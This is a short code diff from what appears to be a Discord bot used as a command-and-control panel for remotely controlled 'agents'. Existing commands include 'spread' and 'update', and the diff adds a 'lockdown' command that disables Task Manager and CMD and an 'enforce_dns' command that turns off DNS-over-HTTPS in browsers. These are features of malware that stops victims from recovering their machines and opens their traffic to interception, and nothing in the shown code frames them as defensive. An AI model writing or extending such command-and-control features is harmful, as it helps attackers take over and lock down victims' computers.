@@ -244,6 +244,16 @@ async def spread_command(interaction: discord.Interaction):
 async def update_command(interaction: discord.Interaction):
     await send_command_to_agent(interaction, "update")
 
+# --- New commands added ---
+@bot.tree.command(name="lockdown", description="Apply system lockdown (disable Task Manager, CMD, etc.)")
+async def lockdown_command(interaction: discord.Interaction):
+    await send_command_to_agent(interaction, "lockdown")
+
+@bot.tree.command(name="enforce_dns", description="Flush DNS cache and disable DNS-over-HTTPS in browsers")
+async def enforce_dns_command(interaction: discord.Interaction):
+    await send_command_to_agent(interaction, "enforce_dns")
+# ------------------- END NEW COMMANDS -------------------
+
 # ------------------- CONTROL CHANNEL COMMANDS (legacy) -------------------
 @bot.command(name="agents")
 async def list_agents(ctx):
